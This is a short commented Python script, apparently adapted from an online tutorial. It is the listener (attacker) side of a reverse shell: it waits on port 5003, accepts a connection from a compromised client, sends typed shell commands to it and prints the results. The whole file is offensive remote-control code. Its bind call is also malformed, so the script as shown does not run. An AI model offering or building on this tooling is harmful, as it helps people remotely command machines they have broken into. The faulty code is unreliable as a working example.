#https://www.thepythoncode.com/article/create-reverse-shell-python
import socket

#Listens for all IPv4 addresses on local machine
SERVER_HOST = "0.0.0.0"
#5003 for TCP, can be any port over 1024, 80 for HTTP or 443 for HTTPS
SERVER_PORT = 5003
#Max message size is set to 128 KB
BUFFER_SIZE = 1024 * 128
#Separator string for 2 messages at once
SEPARATOR = "<sep>"
#Socket object creation
s = socket.socket()

#Bind socket to IP and port
s.bind(SERVER_HOST,SERVER_PORT)
#Listen for connections, parameter allows for 5 unaccepted connectione before refusing new ones
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT}...")

#Accept attempted connections
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

#Receive cwd from client, decode into string object
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory: ",cwd)

#Main loop
while True:
    #Receive command
    command = input(f"{cwd} $> ")
    #Check if command is empty
    if not command.strip():
        continue
    #Send the encoded command to the client
    client_socket.send(command.encode())
    #Check for exit case
    if command.lower() == "exit":
        break
    #Get command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    #Split output from cwd
    results, cwd = output.split(SEPARATOR)
    #Print output
    print(results)